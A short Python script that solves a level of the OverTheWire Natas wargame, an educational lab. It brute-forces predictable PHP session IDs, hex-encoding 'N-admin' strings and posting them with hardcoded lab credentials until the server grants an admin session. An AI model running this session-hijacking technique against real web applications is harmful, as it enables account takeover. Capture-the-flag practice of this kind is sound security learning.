import requests
import time
from requests.auth import HTTPBasicAuth


for i in range(1,640):
    print(f"Testing: {i}", end='\r')
    session_id = f"{i}-admin"
    hex = session_id.encode().hex()
    cookies = {'PHPSESSID': hex}
    req = requests.post('http://natas19.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth('natas19', 'qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT'), cookies=cookies)
    if 'You are an admin' in req.text:
        print(cookies)
        print(req.text)
        break

# cookies = {'PHPSESSID': '119'}
# req = requests.post('http://natas18.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth('natas18', 'fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op'), cookies=cookies)
# print(req.text)